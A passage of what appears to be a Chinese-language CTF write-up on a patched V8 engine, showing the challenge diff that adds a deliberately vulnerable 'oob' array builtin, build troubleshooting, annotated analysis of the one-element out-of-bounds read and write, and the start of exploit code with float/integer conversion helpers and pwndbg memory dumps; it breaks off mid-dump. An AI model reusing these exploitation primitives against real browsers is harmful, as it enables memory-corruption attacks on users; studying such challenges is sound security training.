class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"></span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"></span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>编译v8,在v8目录下</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598 -f</span><br><span class="line">gclient sync</span><br><span class="line">git apply oob.diff</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div><p>如果报错，说明找不到python命令，可以&#x2F;usr&#x2F;bin目录下创个软链接（尽量链接到python2，python3后续还会报错）</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 4653, <span class="keyword">in</span> main</span><br><span class="line">    <span class="built_in">return</span> dispatcher.execute(OptionParser(), argv)</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/subcommand.py&quot;</span>, line 254, <span class="keyword">in</span> execute</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">command</span>(parser, args[1:])</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 4006, <span class="keyword">in</span> CMDsync</span><br><span class="line">    ret = client.RunOnDeps(<span class="string">&#x27;update&#x27;</span>, args)</span><br><span class="line">          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 2517, <span class="keyword">in</span> RunOnDeps</span><br><span class="line">    self.RunHooksRecursively(self._options, pm)</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 1473, <span class="keyword">in</span> RunHooksRecursively</span><br><span class="line">    hook.run()</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 256, <span class="keyword">in</span> run</span><br><span class="line">    gclient_utils.CheckCallAndFilter(cmd,</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient_utils.py&quot;</span>, line 640, <span class="keyword">in</span> CheckCallAndFilter</span><br><span class="line">    kid = subprocess2.Popen(args,</span><br><span class="line">          ^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/subprocess2.py&quot;</span>, line 158, <span class="keyword">in</span> __init__</span><br><span class="line">    raise OSError(</span><br><span class="line">OSError: Execution failed with error: [Errno 2] No such file or directory: <span class="string">&#x27;python&#x27;</span>.</span><br><span class="line">Check that /root/v8 or python exist and have execution permission.</span><br></pre></td></tr></table></figure></div><p>解决</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s $(<span class="built_in">which</span> python2) /usr/bin/python</span><br></pre></td></tr></table></figure></div><p>如果报错</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar (child): xz: Cannot exec: No such file or directory</span><br><span class="line">tar (child): Error is not recoverable: exiting now</span><br><span class="line">tar: Child returned status 2</span><br><span class="line">tar: Error is not recoverable: exiting now</span><br></pre></td></tr></table></figure></div><p>解决</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install xz-utils</span><br></pre></td></tr></table></figure></div><p>如果报错</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  File &quot;/home/fuzz/Fuzzing_v8_75/v8/build/config/linux/pkg-config.py&quot;, line 246, in &lt;module&gt;</span><br><span class="line">    sys.exit(main())</span><br><span class="line">  File &quot;/home/fuzz/Fuzzing_v8_75/v8/build/config/linux/pkg-config.py&quot;, line 141, in main</span><br><span class="line">    prefix = GetPkgConfigPrefixToStrip(options, args)</span><br><span class="line">  File &quot;/home/fuzz/Fuzzing_v8_75/v8/build/config/linux/pkg-config.py&quot;, line 80, in GetPkgConfigPrefixToStrip</span><br><span class="line">    &quot;--variable=prefix&quot;] + args, env=os.environ)</span><br><span class="line">  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 216, in check_output</span><br><span class="line">    process = Popen(stdout=PIPE, *popenargs, **kwargs)</span><br><span class="line">  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 394, in __init__</span><br><span class="line">    errread, errwrite)</span><br><span class="line">  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 1047, in _execute_child</span><br><span class="line">    raise child_exception</span><br><span class="line">OSError: [Errno 2] No such file or directory</span><br><span class="line"></span><br><span class="line">See //build/config/linux/BUILD.gn:89:3: whence it was called.</span><br><span class="line">  pkg_config(&quot;glib&quot;) &#123;</span><br><span class="line">  ^-------------------</span><br><span class="line">See //build/config/compiler/BUILD.gn:218:18: which caused the file to be included.</span><br><span class="line">    configs += [ &quot;//build/config/linux:compiler&quot; ]</span><br></pre></td></tr></table></figure></div><p>解决</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install pkg-config</span><br></pre></td></tr></table></figure></div><h2 id="0x01-patch分析🧐"><a href="#0x01-patch分析🧐" class="headerlink" title="0x01 patch分析🧐"></a>0x01 patch分析🧐</h2><p>注册了叫oob的array内置函数，可以通过形如<code>arr.oob()</code>对任意array调用这个oob</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;oob&quot;</span>,</span><br><span class="line">                       Builtins::kArrayOob,<span class="number">2</span>,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div><p>具体内置函数实现分析</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BUILTIN</span>(ArrayOob)&#123;</span><br><span class="line">    <span class="type">uint32_t</span> len = args.<span class="built_in">length</span>();<span class="comment">//第一个参数被调用oob方法的arr本身</span></span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(isolate).<span class="built_in">undefined_value</span>();<span class="comment">//arr.oob()要不不传参，要么只传一个</span></span><br><span class="line">    Handle&lt;JSReceiver&gt; receiver;<span class="comment">//可以粗略理解成预定义⼀个指向JSReceiver的指针receiver，当然Handle实际上不是指针（涉及gc相关概念），先不展开</span></span><br><span class="line">    <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">            isolate, receiver, Object::<span class="built_in">ToObject</span>(isolate, args.<span class="built_in">receiver</span>()));<span class="comment">//一个宏，对args.receiver()调⽤ToObject函数后保存到receiver⾥，这⾥的args.receiver()实际上就是获取形如arr1.oob()调⽤⾥的arr1本⾝</span></span><br><span class="line">    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::<span class="built_in">cast</span>(receiver);</span><br><span class="line">    FixedDoubleArray elements = FixedDoubleArray::<span class="built_in">cast</span>(array-&gt;<span class="built_in">elements</span>());<span class="comment">//取出array的elements，cast到一个FixedDoubleArray，说明之后就把这个elements当成double array来解析</span></span><br><span class="line">    <span class="type">uint32_t</span> length = <span class="built_in">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(array-&gt;<span class="built_in">length</span>()-&gt;<span class="built_in">Number</span>());</span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//read</span></span><br><span class="line">        <span class="keyword">return</span> *(isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewNumber</span>(elements.<span class="built_in">get_scalar</span>(length)));<span class="comment">//*****</span></span><br><span class="line">      <span class="comment">//如果函数参数只有⼀个，那么它将读取elements[length]的值，并以⼀个double值返回</span></span><br><span class="line">      <span class="comment">//漏洞点，越界读取了一个元素，正常来说应该是elements[length-1]</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//write</span></span><br><span class="line">        Handle&lt;Object&gt; value;<span class="comment">//预定义⼀个指向Object的指针value</span></span><br><span class="line">        <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">                isolate, value, Object::<span class="built_in">ToNumber</span>(isolate, args.<span class="built_in">at</span>&lt;Object&gt;(<span class="number">1</span>)));<span class="comment">//取出参数args的第⼆个参数（oob的传参），对其调⽤ToNumber函数之后保存到value⾥。</span></span><br><span class="line">        elements.<span class="built_in">set</span>(length,value-&gt;<span class="built_in">Number</span>());</span><br><span class="line">      <span class="comment">//elements[length] = value-&gt;Number()，向后越界写一个元素</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(isolate).<span class="built_in">undefined_value</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="0x02-调试方法🐞"><a href="#0x02-调试方法🐞" class="headerlink" title="0x02 调试方法🐞"></a>0x02 调试方法🐞</h2><p>这个patch是用CSA实现的内置函数，最终会转换成汇编，不好打断点调试，因此可以用CSA里面的PrintF来代替printf</p><ul><li>对于<code>Handle&lt;Object&gt;</code>（和<code>Object</code>的⼦类），可以直接在上⾯调⽤<code>xxx-&gt;Print()</code>来输出内存布局</li></ul><p>这里加上</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241115180840728.png"                      alt="image-20241115180840728"                ><figcaption>image-20241115180840728</figcaption></figure></p><p>然后重新编译</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ninja -C out/x64.release d8</span><br><span class="line">tools/dev/gm.py x64.debug</span><br></pre></td></tr></table></figure></div><p>看看调试结果，相当于把job xxx的信息打印出来了</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">a.<span class="title function_">oob</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">a.<span class="title function_">oob</span>();</span><br><span class="line">a.<span class="title function_">oob</span>(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line">➜  v8 <span class="attr">git</span>:(6dc88c191f5) ✗ ./out/x64.<span class="property">release</span>/d8 --allow-natives-syntax poc.<span class="property">js</span></span><br><span class="line"><span class="number">0x0a5c3bbcdd89</span> &lt;<span class="title class_">JSArray</span>[<span class="number">1</span>]&gt;</span><br><span class="line">oob args length is <span class="number">3</span></span><br><span class="line">oob args length is <span class="number">1</span></span><br><span class="line"><span class="number">0xa5c3bbcdd89</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x17a965e82ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x2742413d1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a5c3bbcdd71</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">1</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x1b0aadec0c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x23511b3401a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a5c3bbcdd71</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">oob args length is <span class="number">2</span></span><br><span class="line"><span class="number">0xa5c3bbcdd89</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x17a965e82ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x2742413d1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a5c3bbcdd71</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">1</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x1b0aadec0c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x23511b3401a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a5c3bbcdd71</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="title class_">Smi</span>: <span class="number">0x1</span> (<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><h2 id="0x03-漏洞分析🔍"><a href="#0x03-漏洞分析🔍" class="headerlink" title="0x03 漏洞分析🔍"></a>0x03 漏洞分析🔍</h2><h3 id="oob使用"><a href="#oob使用" class="headerlink" title="oob使用"></a>oob使用</h3><p>首先写过double_arr和obj_arr，u2d d2u gc hex这些都是工具function，后面会用到</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">const</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line"><span class="comment">// Floating point to 64-bit unsigned integer</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="title class_">Array</span>.<span class="title function_">from</span>(u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64-bit unsigned integer to Floating point</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        u32.<span class="title function_">set</span>(tmp);</span><br><span class="line">        <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 32-bit unsigned integer to hex **string**</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">let</span> obj_arr = [&#123;&#125;]</span><br><span class="line">double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);<span class="comment">//重排清空一下</span></span><br><span class="line">obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">double_arr.<span class="title function_">oob</span>(); <span class="comment">//越界读了下一个元素，以double值返回</span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>array.splice(0)</code> 表示从数组的第一个元素开始，删除所有元素。它是用于清空数组或截取数组内容的一种简便方法，同时返回被删除的元素集合。</p></blockquote><p>验证一下越界读</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(double_arr);</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(double_arr.<span class="title function_">oob</span>()))); </span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x39deae34e609</span> &lt;<span class="title class_">JSArray</span>[<span class="number">1</span>]&gt;</span><br><span class="line"><span class="number">0x3d28495c2ed9</span></span><br><span class="line">pwndbg&gt;  job <span class="number">0x39deae34e609</span></span><br><span class="line"><span class="number">0x39deae34e609</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x3d28495c2ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>] </span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x11ebfedd1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x39deae34e5f1</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">1</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x09dc5a3c0c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x3d62f96401a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x39deae34e5f1</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt;  x/20gx <span class="number">0x39deae34e609</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x39deae34e608</span>:<span class="number">0x00003d28495c2ed9</span><span class="number">0x000009dc5a3c0c71</span></span><br><span class="line"><span class="number">0x39deae34e618</span>:<span class="number">0x000039deae34e5f1</span>(elements)<span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x39deae34e628</span>:<span class="number">0x000009dc5a3c0561</span><span class="number">0x00003d28495c2ed9</span></span><br><span class="line"><span class="number">0x39deae34e638</span>:<span class="number">0x000009dc5a3c12c9</span><span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x39deae34e648</span>:<span class="number">0x0000040000000000</span><span class="number">0x00003d28495c2d99</span></span><br><span class="line"><span class="number">0x39deae34e658</span>:<span class="number">0x000009dc5a3c0c71</span><span class="number">0x000039deae34e671</span></span><br><span class="line"><span class="number">0x39deae34e668</span>:<span class="number">0x0000000200000000</span><span class="number">0x000009dc5a3c0801</span></span><br><span class="line"><span class="number">0x39deae34e678</span>:<span class="number">0x0000000400000000</span><span class="number">0x495c2ed900000000</span></span><br><span class="line"><span class="number">0x39deae34e688</span>:<span class="number">0x00003d2800000000</span><span class="number">0x000009dc5a3c05b1</span></span><br><span class="line"><span class="number">0x39deae34e698</span>:<span class="number">0x000009dc5a3c05b1</span><span class="number">0x00003d28495c3ab9</span></span><br><span class="line">pwndbg&gt;  x/20gx <span class="number">0x39deae34e5f1</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x39deae34e5f0</span>:<span class="number">0x000009dc5a3c14f9</span><span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x39deae34e600</span>:<span class="number">0x3ff199999999999a</span>(<span 